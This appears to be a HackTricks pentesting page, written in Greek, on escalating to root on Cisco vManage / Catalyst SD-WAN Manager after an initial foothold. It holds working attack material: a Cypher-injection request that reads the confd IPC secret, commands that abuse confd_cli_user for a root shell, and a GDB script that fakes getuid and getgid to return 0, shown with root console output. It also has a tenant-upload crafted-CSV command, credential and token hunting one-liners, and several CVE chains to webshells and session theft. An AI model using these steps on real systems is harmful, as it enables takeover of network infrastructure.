# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Μόλις αποκτήσεις code execution στο Cisco vManage / *Catalyst SD-WAN Manager* ως `vmanage`, `netadmin`, ή `vmanage-admin`, τα πιο ενδιαφέροντα τοπικά privesc surfaces είναι συνήθως το `confd` CLI stack, το `cmdptywrapper` helper, τα localhost REST APIs, και οι root-owned import/upload handlers.

Αν χρειάζεσαι ακόμα το **initial foothold** σε έναν controller, έλεγξε πρώτα την dedicated control-plane σελίδα:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Αν το `/etc/confd/confd_ipc_secret` είναι αναγνώσιμο από το foothold σου, τα Path 1 και Path 2 γίνονται αμέσως πρακτικά. Αν έφτασες μέσω remote info leak ή webshell, έλεγξε επίσης αν μπορείς ήδη να φτάσεις σε `vmanage-admin` SSH material ή multitenancy upload handlers: έρευνα του 2026 έδειξε ότι και τα δύο ήταν ρεαλιστικά stepping stones.

## Path 1

(Παράδειγμα από [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Αφού ψάξαμε λίγο σε κάποια [documentation](http://66.218.245.39/doc/html/rn03re18.html) σχετική με το `confd` και τα διαφορετικά binaries (προσβάσιμη με λογαριασμό στο Cisco website), βρήκαμε ότι για να κάνει authenticate το IPC socket, χρησιμοποιεί ένα secret που βρίσκεται στο `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Θυμάσαι το instance Neo4j μας; Τρέχει με τα δικαιώματα του χρήστη `vmanage`, επιτρέποντάς μας έτσι να ανακτήσουμε το αρχείο χρησιμοποιώντας το προηγούμενο vulnerability:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Το πρόγραμμα `confd_cli` δεν υποστηρίζει ορίσματα γραμμής εντολών αλλά καλεί το `/usr/bin/confd_cli_user` με ορίσματα. Άρα, θα μπορούσαμε να καλέσουμε απευθείας το `/usr/bin/confd_cli_user` με το δικό μας σύνολο ορισμάτων. Ωστόσο δεν είναι αναγνώσιμο με τα τρέχοντα δικαιώματά μας, οπότε πρέπει να το ανακτήσουμε από το rootfs και να το αντιγράψουμε χρησιμοποιώντας scp, να διαβάσουμε το help, και να το χρησιμοποιήσουμε για να πάρουμε το shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Παράδειγμα από [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Το blog¹ από την ομάδα synacktiv περιέγραψε έναν κομψό τρόπο για να αποκτήσεις ένα root shell, αλλά το caveat είναι ότι απαιτεί να πάρεις ένα αντίγραφο του `/usr/bin/confd_cli_user`, το οποίο είναι αναγνώσιμο μόνο από το root. Βρήκα έναν άλλο τρόπο για privilege escalation σε root χωρίς τέτοιο hassle.

Όταν αποσυναρμολόγησα το binary `/usr/bin/confd_cli`, παρατήρησα τα εξής:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Όταν εκτέλεσα “ps aux”, παρατήρησα το εξής (_σημείωση -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Υπέθεσα ότι το πρόγραμμα “confd_cli” περνά το user ID και το group ID που συνέλεξε από τον συνδεδεμένο user στην εφαρμογή “cmdptywrapper”.

Η πρώτη μου προσπάθεια ήταν να τρέξω το “cmdptywrapper” απευθείας και να του δώσω `-g 0 -u 0`, αλλά απέτυχε. Φαίνεται ότι δημιουργήθηκε κάπου στη διαδρομή ένα file descriptor (-i 1015) και δεν μπορώ να το fake it.

Όπως αναφέρεται στο blog της synacktiv(last example), το πρόγραμμα `confd_cli` δεν υποστηρίζει command line argument, αλλά μπορώ να το επηρεάσω με ένα debugger και ευτυχώς το GDB περιλαμβάνεται στο σύστημα.

Δημιούργησα ένα GDB script όπου εξανάγκασα τα API `getuid` και `getgid` να επιστρέφουν 0. Εφόσον έχω ήδη προνόμιο “vmanage” μέσω του deserialization RCE, έχω άδεια να διαβάσω απευθείας το `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Έξοδος κονσόλας</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Διαδρομή 3 (2025 CLI input validation bug - CVE-2025-20122)

Η Cisco αργότερα τεκμηρίωσε ένα πιο καθαρό local root path στη δική της advisory για το [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): ένας **authenticated attacker with only read-only privileges** μπορούσε να στείλει ένα crafted request στο manager CLI και να γίνει root λόγω ανεπαρκούς input validation.

Από offensive perspective, αυτό είναι το σημαντικό takeaway:

1. Μόλις έχεις *οποιοδήποτε* low-priv foothold στο box, πρέπει να δοκιμάσεις την local CLI service πριν πας για το βαρύτερο Path 1 / Path 2 workflow.
2. Επαναχρησιμοποίησε τα artifacts από το Path 2 για να βρεις το trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Αντιμετώπισε κάθε field που προωθείται στο CLI backend ως ύποπτο: UID/GID, username, terminal metadata, imported files, ή οποιαδήποτε τιμή καταναλώνεται αργότερα από ένα root-owned helper.
4. Αν ένας low-priv user μπορεί να φτάσει το local CLI socket και να επηρεάσει αυτά τα fields, το root μπορεί να απέχει μόνο ένα crafted request.

Ένα πρακτικό workflow αφού προσγειωθείς στη συσκευή είναι:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Αυτό μετατρέπει το bug του 2025 σε ένα καλό hunting pattern για παρόμοιες εκδόσεις: ψάξε για **local CLI shims that collect identity in userland and forward it to a more privileged wrapper**.

Μην μπερδεύεις το **CVE-2025-20122** με το μεταγενέστερο **CVE-2026-20122**: το issue του 2025 είναι ένα *local* CLI-to-root bug, ενώ το issue του 2026 είναι ένα *remote* API arbitrary file overwrite που είναι κυρίως χρήσιμο για να φυτέψεις ένα foothold και μετά να ξαναεπισκεφθείς το Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Η συμβουλή του Cisco για τον Φεβρουάριο 2026 εισήγαγε επίσης μια άλλη χρήσιμη privesc class: το [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) επέτρεπε σε έναν **authenticated, local attacker with low privileges** να αποκτήσει root λόγω ενός ανεπαρκούς user-authentication mechanism στο REST API.

Αυτό έχει σημασία επειδή το vManage privesc δεν περιορίζεται πλέον μόνο σε κατάχρηση του `confd`/TTY. Μετά από ένα low-priv shell, ψάξε επίσης για:

- localhost-only API endpoints που εμπιστεύονται υπερβολικά τον caller
- tokens, cookies, ή service credentials που είναι readable από το τρέχον account
- root-only actions exposed through `dataservice`/REST handlers που μπορούν ακόμα να ενεργοποιηθούν τοπικά

Στην πράξη, μόλις αποκτήσεις shell ως `vmanage` ή άλλο service user, η local API abuse είναι συχνά πιο αθόρυβη και πιο εύκολη να αυτοματοποιηθεί από την interactive CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Εάν το τοπικό session context αρκεί για να χτυπήσει privileged REST λειτουργικότητα, προτίμησε το API path: είναι πιο εύκολο να γίνει replay, να γίνει script, και να αλυσιδωθεί με stolen web sessions ή API tokens.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Ένα άλλο πρόσφατο pattern είναι [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): ένας local attacker με `netadmin` privileges θα μπορούσε να ανεβάσει ένα **crafted file** που το CLI αργότερα χειριζόταν ανασφαλώς, οδηγώντας σε command injection ως `root`.

Από την οπτική του HackTricks, η πολύτιμη technique είναι ευρύτερη από το συγκεκριμένο CVE:

1. Κάνε enumerate κάθε CLI ή web workflow που δέχεται ένα file: imports, diagnostic bundles, templates, validators, backups, tenant data, κ.λπ.
2. Ακολούθησε πού καταλήγει το uploaded file και ποιο root-owned script ή binary το καταναλώνει.
3. Δοκίμασε αν το filename, το file content, ή τα parsed metadata περνούν ποτέ σε shell commands, wrapper scripts, ή helpers τύπου `system()`.
4. Αν μπορείς ήδη να φτάσεις το `netadmin` (valid creds, stolen session, ή ένα auth-bypass chain), τα file-processing bugs είναι συχνά ο πιο γρήγορος δρόμος προς το root.

Αργότερα, η Google Cloud / Mandiant έδειξε ένα πολύ συγκεκριμένο παράδειγμα αυτού του bug class να εκμεταλλεύεται μέσω του multitenancy import path:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Στην παρατηρούμενη επίθεση, το crafted CSV κατέληξε να τροποποιεί τα `/etc/passwd` και `/etc/shadow` για να δημιουργήσει έναν προσωρινό UID 0 λογαριασμό (`troot`). Αυτό κάνει τους `tenant-upload` / `tenant-list` τύπου importers ιδιαίτερα ενδιαφέροντες: δεν είναι απλώς data-ingestion features, αλλά potential root-owned parser front-ends.

Ένα γρήγορο shell-side hunting pattern είναι:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Αυτή η κλάση bug συνδυάζεται ιδιαίτερα καλά με remote footholds που δίνουν `netadmin` αλλά όχι `root`.

## Άλλες πρόσφατες ευπάθειες vManage/Catalyst SD-WAN Manager για chaining

- **Unauthenticated info leak (CVE-2026-20133)** – Ιδιαίτερα υψηλής αξίας, επειδή δημόσια έρευνα έδειξε ότι μπορούσε να εκθέσει το `confd_ipc_secret` ή το ιδιωτικό κλειδί `vmanage-admin`, μετατρέποντας ένα read bug είτε σε Path 1 είτε σε NETCONF pivot.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Διαφορετικό από το 2025 CLI bug παραπάνω· το VulnCheck το χρησιμοποίησε για να ανεβάσει webshell, κάτι που κάνει αμέσως σχετικές τις local privesc διαδρομές σε αυτή τη σελίδα.
- **Authenticated UI XSS (CVE-2024-20475)** – Κλέψε ένα admin session στο web UI, μετά pivot σε API/CLI actions που τελικά φτάνουν σε `vshell` ή σε μία από τις local privesc διαδρομές παραπάνω.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Πολύ ισχυρό precursor για το Path 5, επειδή το `netadmin` είναι ακριβώς το επίπεδο που απαιτεί το 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Παρόμοια offensive value με το CVE-2026-20122 αλλά μέσω μιας μεταγενέστερης web UI upload διαδρομής: γράψε σε μια τοποθεσία που αργότερα θα γίνει parse από root ή από το management-plane web tier.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Οι intrusions του 2026 έδειξαν ότι οι attackers μπορούν να κάνουν rollback σε παλαιότερο vulnerable SD-WAN build, να εκμεταλλευτούν το παλιό CLI root bug και μετά να επαναφέρουν την αρχική έκδοση.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Καλύτερα τεκμηριωμένο στη dedicated SD-WAN control-plane σελίδα· μπορεί να προσθέσει ένα SSH key για το `vmanage-admin`, δίνοντάς σου το local foothold που χρειάζεται για να ξαναδείς αυτή τη σελίδα.



## Αναφορές

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
